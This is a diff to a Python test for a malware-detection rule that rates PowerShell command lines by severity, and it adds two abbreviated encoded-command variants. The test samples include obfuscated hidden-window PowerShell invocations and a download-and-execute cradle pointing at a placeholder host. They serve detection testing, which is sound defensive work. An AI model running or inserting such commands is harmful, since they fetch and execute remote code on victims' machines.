@@ -197,6 +197,8 @@ def test_malfind_rules(row: dict[str, Any], want: str | None) -> None:
         ("powershell.exe -enc AAAA", "medium"),
         ("powershell.exe -EncodedCommand AAAA -WindowStyle Hidden", "high"),
         ("powershell -c IEX (New-Object Net.WebClient).DownloadString('https://example.invalid/a')", "medium"),
+        ("powershell.exe -encodedcom AAAA", "medium"),
+        ("powershell.exe /enc AAAA -windows hidden", "high"),
         ("powershell.exe -File C:\\scripts\\backup.ps1", None),
     ],
 )
